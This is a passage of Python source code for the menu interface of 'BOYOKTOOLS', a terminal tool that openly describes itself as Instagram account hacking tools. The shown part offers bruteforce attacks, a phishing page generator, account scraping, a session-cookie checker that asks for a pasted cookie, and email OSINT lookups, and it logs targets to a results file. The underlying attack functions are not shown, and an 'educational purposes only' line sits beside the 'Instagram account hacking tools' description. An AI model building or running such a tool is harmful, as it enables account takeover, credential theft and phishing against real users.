        print(f"{Fore.YELLOW}[!] Paste your Instagram session cookie")
        cookie = input(f"{Fore.WHITE}[>] Cookie: ").strip()
        
        result = self.tools['session'].check_session(cookie)
        
        print(f"\n{Fore.GREEN}─────────────────────────────────────────────────────")
        print(f"{Fore.GREEN}✓ SESSION ANALYSIS")
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        print(f"{Fore.WHITE}Status: {Fore.GREEN if result['valid'] else Fore.RED}{'Valid' if result['valid'] else 'Invalid'}")
        if result['username']:
            print(f"{Fore.WHITE}Username: {Fore.CYAN}{result['username']}")
        if result['user_id']:
            print(f"{Fore.WHITE}User ID: {Fore.CYAN}{result['user_id']}")
        print(f"{Fore.WHITE}Message: {Fore.CYAN}{result['message']}")
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        
        input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
        
    def osint_method(self):
        """Email OSINT search"""
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}METHOD 6: EMAIL OSINT SEARCH{Fore.CYAN}                      │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        email = input(f"{Fore.WHITE}[>] Email address: ").strip()
        
        print(f"\n{Fore.YELLOW}[!] Searching for information...\n")
        
        result = self.tools['osint'].search_email(email)
        
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        print(f"{Fore.GREEN}✓ OSINT RESULTS")
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        print(f"{Fore.WHITE}Email: {Fore.CYAN}{result['email']}")
        
        if result['social_media']:
            print(f"\n{Fore.WHITE}Social Media Found:")
            for sm in result['social_media']:
                print(f"  • {Fore.CYAN}{sm['platform']}: {sm['profile']}")
        else:
            print(f"\n{Fore.RED}No social media found")
        
        if result['platforms']:
            print(f"\n{Fore.WHITE}Platforms:")
            for platform in result['platforms']:
                print(f"  • {Fore.CYAN}{platform}")
        print(f"{Fore.GREEN}─────────────────────────────────────────────────────")
        
        input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
        
    def save_result(self, method: str, target: str, result: str):
        """Save result to file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open('boyoktools_results.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {method.upper()} | Target: {target} | Result: {result}\n")
        
    def show_menu(self):
        """Display main menu"""
        while True:
            self.show_banner()
            
            print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
            print(f"{Fore.CYAN}│  {Fore.GREEN}BOYOKTOOLS MAIN MENU{Fore.CYAN}                             │")
            print(f"{Fore.CYAN}├─────────────────────────────────────────────────────┤")
            print(f"{Fore.GREEN}│  {Fore.WHITE}1. {Fore.YELLOW}BRUTEFORCE ATTACK{Fore.CYAN}                       │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}2. {Fore.YELLOW}PHISHING PAGE GENERATOR{Fore.CYAN}                 │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}3. {Fore.YELLOW}ACCOUNT INFO SCRAPER{Fore.CYAN}                   │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}4. {Fore.YELLOW}PASSWORD STRENGTH CHECKER{Fore.CYAN}              │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}5. {Fore.YELLOW}SESSION COOKIE CHECKER{Fore.CYAN}                 │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}6. {Fore.YELLOW}EMAIL OSINT SEARCH{Fore.CYAN}                     │")
            print(f"{Fore.CYAN}├─────────────────────────────────────────────────────┤")
            print(f"{Fore.GREEN}│  {Fore.WHITE}7. {Fore.CYAN}SHOW RESULTS{Fore.CYAN}                             │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}8. {Fore.CYAN}ABOUT{Fore.CYAN}                                    │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}0. {Fore.RED}EXIT{Fore.CYAN}                                     │")
            print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘")
            
            choice = input(f"\n{Fore.YELLOW}[>] Choose option: ").strip()
            
            if choice == '1':
                self.bruteforce_method()
            elif choice == '2':
                self.phishing_method()
            elif choice == '3':
                self.scrape_method()
            elif choice == '4':
                self.password_method()
            elif choice == '5':
                self.session_method()
            elif choice == '6':
                self.osint_method()
            elif choice == '7':
                self.show_results()
            elif choice == '8':
                self.about()
            elif choice == '0':
                print(f"\n{Fore.GREEN}[*] Thank you for using BOYOKTOOLS!")
                print(f"{Fore.CYAN}[*] Developed by: {DEVELOPER}")
                print(f"{Fore.CYAN}[*] TikTok: {TIKTOK}")
                sys.exit()
            else:
                print(f"{Fore.RED}[!] Invalid option")
                time.sleep(1)
    
    def show_results(self):
        """Show saved results"""
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}SAVED RESULTS{Fore.CYAN}                                     │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        try:
            with open('boyoktools_results.txt', 'r', encoding='utf-8') as f:
                results = f.read()
                if results:
                    print(f"{Fore.WHITE}{results}")
                else:
                    print(f"{Fore.YELLOW}[!] No results saved yet")
        except FileNotFoundError:
            print(f"{Fore.YELLOW}[!] No results file found")
        
        input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
    
    def about(self):
        """About BOYOKTOOLS"""
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}ABOUT BOYOKTOOLS{Fore.CYAN}                                   │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        print(f"{Fore.WHITE}Tool Name: {Fore.CYAN}BOYOKTOOLS")
        print(f"{Fore.WHITE}Version: {Fore.CYAN}{VERSION}")
        print(f"{Fore.WHITE}Developer: {Fore.CYAN}{DEVELOPER}")
        print(f"{Fore.WHITE}TikTok: {Fore.CYAN}{TIKTOK}")
        print(f"{Fore.WHITE}Platform: {Fore.CYAN}Instagram")
        print(f"{Fore.WHITE}Status: {Fore.GREEN}REAL TOOLS - NO GIMMICK")
        print(f"{Fore.WHITE}Description: {Fore.CYAN}Instagram account hacking tools")
        print(f"{Fore.WHITE}Methods: {Fore.CYAN}Bruteforce, Phishing, Scraping, OSINT")
        print(f"{Fore.WHITE}Note: {Fore.YELLOW}Use responsibly and for educational purposes only")
        
        input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")

# ==================== MAIN ====================
def main():
    """Main entry point"""
    try:
        tools = BOYOKTOOLS()
        tools.show_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Interrupted")
        print(f"{Fore.CYAN}[*] Thanks for using BOYOKTOOLS!")
        print(f"{Fore.CYAN}[*] Developed by: {DEVELOPER}")
        sys.exit()
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}")
        sys.exit()

if __name__ == '__main__':
    main()
